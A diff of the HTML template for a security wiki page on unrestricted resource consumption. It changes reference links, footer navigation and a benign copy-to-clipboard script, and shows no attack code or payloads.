 <p><a href="https://learn.snyk.io/lesson/unrestricted-resource-consumption/?ecosystem=python" target="_blank" rel="noreferrer noopener nofollow">https://learn.snyk.io/lesson/unrestricted-resource-consumption/?ecosystem=python</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://www.paloaltonetworks.in/cyberpedia/unrestricted-resource-consumption" target="_blank" rel="noreferrer noopener nofollow">https://www.paloaltonetworks.in/cyberpedia/unrestricted-resource-consumption</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://blog.securelayer7.net/unrestricted-resource-consumption/" target="_blank" rel="noreferrer noopener nofollow">https://blog.securelayer7.net/unrestricted-resource-consumption/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1756,49 +1658,62 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Unrestricted%20Resource%20Consumption.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Token Predictability / Poor Randomness</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Vulnerable-Outdated-Components/" class="flex align-center">
+        <span>Vulnerable &amp; Outdated Components</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1847,15 +1762,24 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
